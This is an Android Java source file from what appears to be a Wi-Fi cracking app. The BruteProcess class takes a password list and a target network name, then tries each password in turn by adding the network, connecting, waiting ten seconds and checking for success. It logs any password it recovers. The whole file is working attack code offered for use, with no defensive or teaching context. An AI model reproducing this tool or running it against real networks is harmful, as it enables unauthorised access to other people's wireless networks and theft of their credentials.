package BruteFragment;

import android.app.Activity;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Bundle;

import java.util.List;
import java.util.Objects;

import androidx.fragment.app.FragmentManager;

import logic.SetLog;

public class BruteProcess extends AsyncTask {

    private List<String> passwordList;

    private WifiManager wifiManager;
    private WifiConfiguration wifiConfiguration;

    private String currentBruteWifiSSID;

    private String parsePassword;

    private int netId;
    private int threadValue;

    private Activity activity;

    private FragmentManager fragmentManager;

    private byte flagBrute = 0;
    private static byte flagStopBrute = 0;
    private String logAsync = "";
    private Bundle bundle = new Bundle();

    private SetLog setLog;

    BruteProcess(List<String> passwordList, WifiManager wifiManager, String currentBruteWifiSSID,
                 FragmentManager fragmentManager, Activity activity, int threadValue) {
        this.currentBruteWifiSSID = currentBruteWifiSSID;
        this.fragmentManager = fragmentManager;
        this.wifiManager = wifiManager;
        this.passwordList = passwordList;
        this.activity = activity;
        this.threadValue = threadValue;
        this.setLog = new SetLog(fragmentManager);
    }

    private void Brute() {
        for (int i = 0; i < passwordList.size(); i++) {
            if (flagBrute == 0) {
                flagBrute = 1;
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append("当前ssid:" + currentBruteWifiSSID+" 尝试" + (i + 1) + "/" + passwordList.size() + "密码： " + passwordList.get(i) + " ");
                wifiManager.removeNetwork(netId);
                /* Config */
                WifiGeneratedConfig(i);
                /* Try connect */
                TryConnect();
                /* Thread */
                SleepAfter();
                logAsync = stringBuilder.toString();
                publishProgress(i);
                /* Success brute */
                if (CheckSuccessConnect()) {
                    parsePassword = passwordList.get(i);
                    break;
                }
                /* Stop brute */
                if (flagStopBrute == 1)
                    break;
            }
        }
    }

    /* Generated new pass and wifi */
    private void WifiGeneratedConfig(int i) {
        wifiConfiguration = new WifiConfiguration();
        wifiConfiguration.SSID = String.format("\"%s\"", currentBruteWifiSSID); /* Set wifi name */
        wifiConfiguration.preSharedKey = String.format("\"%s\"", passwordList.get(i)); /* Set current password */
    }

    /* Try connect to new wifi */
    private void TryConnect() {
        netId = wifiManager.addNetwork(wifiConfiguration);
        wifiManager.disconnect();
        wifiManager.enableNetwork(netId, true);
        wifiManager.reconnect();
    }

    /* Sleep after connect */
    private void SleepAfter() {
        try {
            Thread.sleep(10000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected Object doInBackground(Object[] objects) {
        bundle.putInt("setProgressBarMax", passwordList.size());
        fragmentManager.setFragmentResult("setProgressBarMax", bundle);
        flagStopBrute = 0;
        parsePassword = "";
        Brute();
        return null;
    }

    @Override
    protected void onPostExecute(Object o) {
        super.onPostExecute(o);
        setLog.SetLogResult("Finish brute wifi: " + currentBruteWifiSSID);
        setLog.SetLogCurrentWifi("");
        bundle.putInt("resetProgressBar", 0);
        fragmentManager.setFragmentResult("resetProgressBar", bundle);
        setLog.SetLogCurrentProgress("");
        if (!parsePassword.equals(""))
            SuccessParsePassword();
        BruteFragment bruteFragment = new BruteFragment();
        bruteFragment.setFlagCurrentBrute((byte) 0);
    }

    @Override
    protected void onProgressUpdate(Object[] values) {
        super.onProgressUpdate(values);
        bundle.putInt("setProgressBar", Integer.parseInt(values[0].toString()));
        fragmentManager.setFragmentResult("setProgressBar", bundle);
        setLog.SetLogCurrentProgress("Brute progress " + values[0].toString() + " with < " + passwordList.size() + " passwords \n");
        setLog.SetLogResult(logAsync);
    }

    /* Check success connection */
    private boolean CheckSuccessConnect() {
        ConnectivityManager connectivityManager = (ConnectivityManager) activity.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = Objects.requireNonNull(connectivityManager).getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        WifiManager wifiMgr = (WifiManager) activity.getSystemService(Context.WIFI_SERVICE);
        int wifiState = wifiMgr.getWifiState();
        WifiInfo info = wifiMgr.getConnectionInfo();
        String wifiId = info != null ? info.getSSID().substring(1, info.getSSID().length() - 1) : null;
        flagBrute = 0;
        return Objects.requireNonNull(networkInfo).isConnected() ?
                currentBruteWifiSSID.equals(wifiId) : false;
    }

    /* Success parse */
    private void SuccessParsePassword() {
        setLog.SetLogResult("Pass to WIF:" + currentBruteWifiSSID + "Pass: " + parsePassword);
        setLog.SetLogGoodResults("WIFI: " + currentBruteWifiSSID + " Pass: " + parsePassword);
    }

    public static byte getStopBrute() {
        return flagStopBrute;
    }

    static void setStopBrute() {
        BruteProcess.flagStopBrute = (byte) 1;
    }
}

